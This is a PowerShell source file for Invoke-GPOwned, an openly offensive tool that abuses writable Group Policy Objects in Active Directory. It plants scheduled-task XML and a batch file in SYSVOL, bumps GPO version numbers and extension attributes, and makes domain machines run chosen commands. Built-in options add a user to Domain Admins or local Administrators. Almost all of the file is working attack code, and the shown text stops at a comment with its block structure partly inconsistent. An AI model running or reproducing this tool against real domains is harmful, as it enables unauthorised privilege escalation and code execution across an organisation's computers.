function Invoke-GPOwned {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [Alias("guid")]
        [string]$GPOGUID,

        [Parameter(Mandatory=$false)]
        [Alias("gpo")]
        [string]$GPOName,
        
        [Parameter(Mandatory=$false)]
        [Alias("int")]
        [string]$Interval,

        [Parameter(Mandatory=$false)]
        [Alias("xml")]
        [string]$ScheduledTasksXMLPath,

        [Parameter(Mandatory=$false)]
        [Alias("u")]
        [string]$User,

        [Parameter(Mandatory=$false)]
        [Alias("a")]
        [string]$Author,

        [Parameter(Mandatory=$false)]
        [Alias("d")]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [Alias("c")]
        [string]$Computer,
        
        [Parameter(Mandatory=$false)]
        [Alias("h")]
        [switch]$Help,

        [Parameter(Mandatory=$false)]
        [switch]$DA,

        [Parameter(Mandatory=$false)]
        [switch]$Local,

        [Parameter(Mandatory=$false)]
        [Alias("dll")]
        [string]$LoadDLL,

        [Parameter(Mandatory=$false)]
        [string]$CMD,
        
        [Parameter(Mandatory=$false)]
        [Alias("ps")]
        [string]$PowerShell,

        [Parameter(Mandatory=$false)]
        [Alias("stx")]
        [string]$SecondTaskXMLPath,

        [Parameter(Mandatory=$false)]
        [Alias("scmd")]
        [string]$SecondXMLCMD,  
        
        [Parameter(Mandatory=$false)]
        [Alias("sps")]
        [string]$SecondPowerShell,

        [Parameter(Mandatory=$false)]
        [string]$Log  
    )

    # Display help message if Help switch is used or required parameters are missing
    if ($Help -or (!$GPOGUID -and !$GPOName) -or !($ScheduledTasksXMLPath) -or !($Computer)) {
        Write-Output @"
Invoke-GPOwned Help:

Examples: 
- GPO Linked to DC:
Invoke-GPOwned -GPOName "Default Domain Policy" -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User UserToElevate -Computer dc01.noteasy.local

- GPO Linked to a workstation:
Invoke-GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User UserToElevate -Computer pc01.noteasy.local -Local

- GPO Linked to a workstation with a DA Session:
Invoke-GPOwned -GPOGUID "{D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA}" -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -Computer "pc-01.noteasy.local" -Author "DAUser" -SecondTaskXMLPath ".\wsadd.xml" -SecondXMLCMD '/r net group "domain admins" UserToElevate /add /dom'

Parameters:
-GPOGUID/-guid: Group Policy GUID
-GPOName/-gpo: Name of the Group Policy Object
-Interval/-int: Interval for GPO update
-ScheduledTasksXMLPath/-xml: Full path to the ScheduledTasks xml file
-User/-u: Target user to elevate, mandatory for Local technique
-Author/-a: Author of the GPO changes
-Domain/-d: Target domain, current domain is used by default
-Computer/-c: Target computer
-Help/-h: Display this help message
-DA: Adds the user to the domain admins group
-Local: Adds a chosen user to the local administrators group on the defined computer
-LoadDLL/-dll: Load the Microsoft.ActiveDirectory.Management.dll from a custom path, if not supplied it will try to download it to the current directory
-CMD: Execute a custom cmd command
-PowerShell/-ps: Execute a custom powershell command
-SecondTaskXMLPath/-stx: Using the wsadd.xml file, run commands as a domain admin on workstations that are not domain controllers, if used there's no need to supply -CMD or -PowerShell flags
-SecondXMLCMD/-scmd: Execute a command with the second XML technique
-SecondPowerShell/-sps: Execute a command with the second XML technique using PowerShell
-Log: Log the entire output of the tool into a text file
"@
        return
    }

    # Define color-coded output messages
    $red = Write-Output "$([char]0x1b)[101m[-]$([char]0x1b)[0m"
    $green = Write-Output "$([char]0x1b)[102m[+]$([char]0x1b)[0m"
    $gray = Write-Output "$([char]0x1b)[100m[*]$([char]0x1b)[0m"

    # Enabling TLS and loading the ActiveDirectory module to memory
    if($Log){
        Start-Transcript -Path $Log
    }
    # Load the ActiveDirectory module from a custom path or download it if not provided
    if(!($LoadDLL)){
        Import-Module .\Microsoft.ActiveDirectory.Management.dll
        Import-Module ActiveDirectory 2>&1>$null
        $mod = (Get-Module | Select-Object -ExpandProperty Name | Where-Object { $_ -like "*activedirectory*" })
        if(($mod -like "Microsoft.ActiveDirectory.Management" -or $mod -like "ActiveDirectory")){
            $null
        } else {
            $red+" ActiveDirectory module failed to load!"
            return
        }
    } elseif($LoadDLL) {
        Get-ChildItem -Path . -Recurse | Unblock-File
        Import-Module $LoadDLL -ErrorAction Stop
        $mod = (Get-Module | Select-Object -ExpandProperty Name | Where-Object { $_ -like "*activedirectory*" })
        if(($mod -like "Microsoft.ActiveDirectory.Management" -or $mod -like "ActiveDirectory")){
            $null
        } else {
            $red+" ActiveDirectory module failed to load!"
            return
        }
    } else {
        $red+" Couldn't load DLL, exiting..."
        return
    }

    $allPSModules = Get-Module | select -ExpandProperty Name
    foreach($module in $allPSModules){
        if($module -eq "GroupPolicy"){
            $moduleExists = $true
        } else {
            $moduleExists = $false
        }
    }
    if($moduleExists -eq $false){
        Unblock-File .\GroupPolicy.psd1 2>&1>$null
        Unblock-File .\GroupPolicy.format.ps1xml 2>&1>$null
        Import-Module .\GroupPolicy.psd1
    }

    Function Set-GPOStatus
    {
        [CmdletBinding(SupportsShouldProcess)]

        Param
        (
            [Parameter(
                Mandatory=$True,
                ValueFromPipeline,
                ValueFromPipelinebyPropertyName
            )]
            $DisplayName,

            [Parameter(ValueFromPipelineByPropertyName)]
            [ValidateSet(
                'AllSettingsEnabled',
                'AllSettingsDisabled',
                'ComputerSettingsDisabled',
                'UserSettingsDisabled'
            )]
            $Status,

            [string]
            $Domain,

            [string]
            $Server
        )

        Begin
        {
            $Splat = @{ ErrorAction="Stop" }
            if ($Domain) { $Splat.Add("Domain",$Domain) }
            if ($Server) { $Splat.Add("Server",$Server) }
        }

        Process
        {
            if ($Displayname -is [string])
            {
                $Splat.Add("Name",$DisplayName)
            
                Try { $Gpo = Get-GPO @Splat } Catch { $_; return }
            }
            else
            {
                $Splat.Add("GUID",$DisplayName.Id)
                $Gpo = $DisplayName
            }

            if ($PSCmdlet.ShouldProcess("$($Gpo.Displayname) : $Status "))
            {
                $Gpo.GpoStatus = $Status
            }
        }
    }

    # Use provided domain or get it from AD
    if ($Domain) {
        $domain = $Domain
    } else {
        $domain = (Get-ADDomain).Forest
    }

    $domaindn = (Get-ADDomain).DistinguishedName
    
    # Use provided DC or get it from AD
    if ($Computer) {
        $dc = $Computer
    } else {
        $dc = (Get-ADDomain).InfrastructureMaster
    }

    if ($GPOName) {
        try {
            $GPOGUID = (Get-ADObject -Filter "objectClass -eq 'groupPolicyContainer' -and displayName -eq '$GPOName'" -Properties DisplayName -ErrorAction Stop).Name
            if (!$GPOGUID) {
                throw "GPO not found"
            }
            $green+" Resolved GPO '$GPOName' to GUID: $GPOGUID"
        }
        catch {
            $red+" Failed to find GPO with name: $GPOName"
            return
        }


    $gpoPath = "CN=$GPOGUID,CN=Policies,CN=System,$domaindn"
    $checkgpo = (Get-Acl -Path "AD:$gpoPath").Access |
    Where-Object {
        $_.ActiveDirectoryRights -match "GenericWrite|WriteProperty|WriteDacl|WriteOwner|GenericAll" -and
        ($_.IdentityReference -match "$env:USERNAME|Authenticated Users|Domain Users|Everyone")
    }

    $isComputerEnabled = (Get-GPO "$GPOName" | select -ExpandProperty GpoStatus)

    if($isComputerEnabled -eq "AllSettingsDisabled" -or $isComputerEnabled -eq "ComputerSettingsDisabled"){
        Get-GPO "$GPOName" | Set-GPOStatus -Status AllSettingsEnabled
        $green+' Changed GPO Status to "AllSettingsEnabled"'
    }

    if(!$checkgpo){
        $red+" You don't have permissions to modify this GPO!"
        return
    }

    # Checking for gPCMachineExtensionNames for the means of backup and restoration after execution
    if(Get-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object -ExpandProperty gPCMachineExtensionNames -ErrorAction SilentlyContinue){
        $InitialExtensions = (Get-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object -ExpandProperty gPCMachineExtensionNames);
    } else {
        $noext=1
    }

    # Look for an active domain admin account
    if($Author){
        $dauser = $Author
    } else {
        $i = 0
        while($gotcha -ne "1"){
            $dauser = (Get-ADGroupMember "Domain Admins" | Select-Object -ExpandProperty SamAccountName)[$i]
            if((Get-ADUser $dauser -Properties Enabled).Enabled -eq $true){
                $gotcha++
            } else {
                $i++
            }
        }
    }

    # Validate the provided ScheduledTasks XML file
    $validatexml = Get-Content $ScheduledTasksXMLPath
    if(-not(Test-Path $ScheduledTasksXMLPath)){
        $red+" XML file not found!."
        break
    }elseif($validatexml.StartsWith("<?xml version")){
        $green+" XML File is valid!."
    }else{
        $red+" XML file empty or corrupted!."
        exit(0)
    }

    # Validate the provided SecondTask XML file if provided
    if($SecondTaskXMLPath){
        $validatesecondxml = Get-Content $SecondTaskXMLPath
        if(-not(Test-Path $SecondTaskXMLPath)){
        $red+" XML file not found!."
        break
    }
    elseif($validatesecondxml.StartsWith("<?xml version")){
        $green+" Second XML File is valid!."
        $cont = "powershell -NoProfile -ExecutionPolicy Bypass -Command `"Start-Process powershell -Verb RunAs -ArgumentList `"(`$Task=Get-Content '\\$domain\sysvol\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml' -raw); Register-ScheduledTask -Xml `$Task -TaskName OWNED2`""
        Set-Content -Path .\add.bat -Value $cont
        New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
        Copy-Item $SecondTaskXMLPath "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
        Copy-Item add.bat "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\add.bat" -Force 2>&1>$null
        $green+" Created wsadd.xml and add.bat files in SYSVOL!"
        
        $boundary = (Get-Date).AddHours(24).ToString("s")
        
        # Modify the SecondTask XML file with the provided command or PowerShell script
        if($SecondXMLCMD){
            $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml"
            $encoding = 'ASCII'
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "autoremove","$boundary"} |
                        Set-Content -Encoding $encoding $xmlfile -Force                        
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "commandtype","cmd.exe"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$SecondXMLCMD"} |
                            Set-Content -Encoding $encoding $xmlfile -Force
        } elseif($SecondPowerShell){
            $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml"
            $encoding = 'ASCII'
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "autoremove","$boundary"} |
                        Set-Content -Encoding $encoding $xmlfile -Force                  
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "commandtype","powershell.exe"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$SecondPowerShell"} |
                            Set-Content -Encoding $encoding $xmlfile -Force
        }else{
            $red+" XML file empty or corrupted!."
        return
        } 
    }
    }

    # Checking whether a ScheduledTasks.xml file exists in SYSVOL for the means of backup and restoration after execution
    if(Get-Content "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -ErrorAction SilentlyContinue){
        Copy-Item "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old"
       $gray+" ScheduledTasks file in SYSVOL exists, created a backup file!"
        Copy-Item $ScheduledTasksXMLPath "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
    } else {
        New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
        Copy-Item $ScheduledTasksXMLPath "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
        $green+" Created ScheduledTasks file in SYSVOL!"
    }

    # Modifying the ScheduledTasks.xml with the gathered information
    if($DA){
        if(!$User){
            $User = Read-Host "Supply user to elevate!"
            if($null -eq $User){
                return
        }
        }
        $dacommand = '/r net group "Domain Admins" '+$User+' /add /dom'
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$dacommand"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
        $green+" ScheduledTasks file modified to add $User to the Domain Admins group!"
        if(-not(Test-Path \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml)){
            Write-Host "can't write to SYSVOL, exiting..."
            Pause
            exit
        }
    } elseif($Local){
        if(!$User){
            $User = Read-Host "Supply user to elevate!"
            if($null -eq $User){
                return
        }
        }
        $localcommand = '/r net localgroup Administrators '+$User+' /add'
        
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$localcommand"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $green+" ScheduledTasks file modified to add $User to local administrators group on $Computer!"
        if(-not(Test-Path \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml)){
            Write-Host "can't write to SYSVOL, exiting..."
            Pause
            exit
        }
    } else {
        if($SecondTaskXMLPath){
            
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\add.bat"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $green+" ScheduledTasks file modified to run the add.bat file!."
        }

        # Modify the ScheduledTasks XML file with the provided PowerShell script
        if($PowerShell){
            if(($PowerShell.StartsWith("-c "))){
                $PowerShell = $PowerShell.replace("-c ","")
            } elseif(($PowerShell.StartsWith("-Command "))){
                $PowerShell = $PowerShell.replace("-Command ","")
        }
        
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "cmd.exe","powershell.exe"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","-Command $PowerShell"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $green+" ScheduledTasks file modified with the supplied powershell custom command!."
        if(-not(Test-Path \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml)){
            Write-Host "can't write to SYSVOL, exiting..."
            Pause
            exit
        }
    }

    # Modify the ScheduledTasks XML file with the provided CMD command
    if($CMD){
        if(($CMD.StartsWith("/c "))){
            $CMD = $CMD.replace("/c ","")
        } elseif(($CMD.StartsWith("/r "))){
            $CMD = $CMD.replace("/r ","")
        }
        
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r $CMD; mkdir $tempFile"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $green+" ScheduledTasks file modified with the supplied custom command!."
        if(-not(Test-Path \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml)){
            Write-Host "can't write to SYSVOL, exiting..."
            Pause
            exit
        }
    }

    # Ensure at least one of the required flags is provided
    if(!$CMD -and !$PowerShell -and !$SecondTaskXMLPath) {
        $red+" Either the -Local/-DA/-CMD/-PowerShell flags are required for execution!."
        return
    }
    }

        # Incrementing GPT.INI Version by 1
        $Ext = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
        $gray+" Incrementing GPT.INI Version by 1"
        
        try {
            # First try to update AD version to ensure we can make changes
            $currentVersion = (Get-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name versionNumber -ErrorAction Stop | 
                Select-Object -ExpandProperty versionNumber)
            $gray+" Current GPO AD versionNumber = $currentVersion"
            $gray+" Incrementing version by 1"
            $newVersionValue = $currentVersion+1
            Set-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name versionNumber -Value $newVersionValue -ErrorAction Stop
            
            # Verify AD version update succeeded
            $updatedVersion = (Get-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name versionNumber -ErrorAction Stop | 
                Select-Object -ExpandProperty versionNumber)
            if ($updatedVersion -ne $newVersionValue) {
                throw "AD version update verification failed"
            }
            $gray+" GPO AD versionNumber = $updatedVersion"
    
            # Only after AD update succeeds, update GPT.INI
            $gptIniFilePath = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\GPT.INI"
            $encoding = 'ASCII'
            $gptIniContent = Get-Content -Encoding $encoding -Path $gptIniFilePath -ErrorAction Stop
    
            foreach ($s in $gptIniContent) {
                if($s.StartsWith("Version")) {
                    $num = ($s -split "=")[1]
                    $ver = [Convert]::ToInt32($num)
                    $newVer = $ver + 1
                    (Get-Content $gptIniFilePath) | ForEach-Object {$_ -replace "$ver","$newver" } |
                        Set-Content -Encoding $encoding $gptIniFilePath -Force -ErrorAction Stop
                    break
                }
            }
    
        } catch {
            $red+" Failed to update GPO versions: $($_.Exception.Message)"
            return
        }

    # Display current gPCMachineExtensionNames
    if($noext -ne 1){
        $gray+" Current gPCMachineExtensionNames : $InitialExtensions"
    } else {
        $gray+" Current gPCMachineExtensionNames : <not set>"
    }

    # Modifying the gPCMachineExtensionNames attribute of the policy
    $gray+" Adding Extensions to the attribute"
    Set-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value $Ext$InitialExtensions
    $FinalizedGPO = (Get-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object -ExpandProperty gPCMachineExtensionNames)
    if($FinalizedGPO.StartsWith("[{00000000")){
        $green+" Successfully written extensions to GPO!"
    } else {
        $red+" Failed to write gPCMachineExtensionNames!"
        return
    }

    # A bad loading screen counting up to 300(5 minute update interval on DCs)
    if($DA){
        if($Interval){
            for ($x = 1; $x -le $Interval; $x++){
                $PercentCompleted = ($x/$Interval*100)
                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
                Start-Sleep -Seconds 60
                if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
                    break
                }
            }
        } else {
            for ($x = 1; $x -le 90; $x++){
                $PercentCompleted = ($x/90*100)
                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
                Start-Sleep -Seconds 60
                if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
                    break
                }
            }
        }
        $green+" User added to the domain admins group!"
    } elseif($Local){
        if($Interval){
            for ($x = 1; $x -le $Interval; $x++){
                $PercentCompleted = ($x/$Interval*100)
                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
                Start-Sleep -Seconds 60
                if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | Select-Object -ExpandProperty Name | Where-Object {$_ -like "*$User*"})) {
                    break
                }
            }
        } else {
            for ($x = 1; $x -le 90; $x++){
                $PercentCompleted = ($x/90*100)
                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
                Start-Sleep -Seconds 60
                if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | Select-Object -ExpandProperty Name | Where-Object {$_ -like "*$User*"})) {
                    break
                }
            }
        }
        $green+" User added to the local admins group!"
    }elseif($CMD -or $PowerShell){
        if($Interval){
           for ($x = 1; $x -le $Interval; $x++){
                $PercentCompleted = ($x/$Interval*100)
                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
                Start-Sleep -Seconds 60
                try {
                    if (Get-ScheduledTask -TaskName OWNED -CimSession $dc) {
                        $green+" Command executed successfully!"    
                        break
                    }
                } catch {}
            }
        } else {
             for ($x = 1; $x -le 90; $x++){
                $PercentCompleted = ($x/90*100)
                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
                Start-Sleep -Seconds 60
                try {
                    if (Get-ScheduledTask -TaskName OWNED -CimSession $dc) {
                        $green+" Command executed successfully!"    
                        break
                    }
                } catch {}
            }
        }
    }elseif($SecondTaskXMLPath){
        if(!$User){
            $User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
        }
        if($Interval){
            for ($x = 1; $x -le $Interval; $x++){
                $PercentCompleted = ($x/$Interval*100)
                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
                Start-Sleep -Seconds 60
                if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
                    break
                }          
            }   
        } else {
           for ($x = 1; $x -le 90; $x++){
                $PercentCompleted = ($x/90*100)
                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
                Start-Sleep -Seconds 60
                if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
                    break
                }          
            }   
        }
    }
    }elseif($SecondTaskXMLPath){
        if(!$User){
            $User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
        }
        for ($x = 1; $x -le 180; $x++){
                $PercentCompleted = ($x/180*100)
            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
            Start-Sleep -Seconds 60
            if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
                break
            }          
        }   
    }

    # Reverting extensions back to what they were
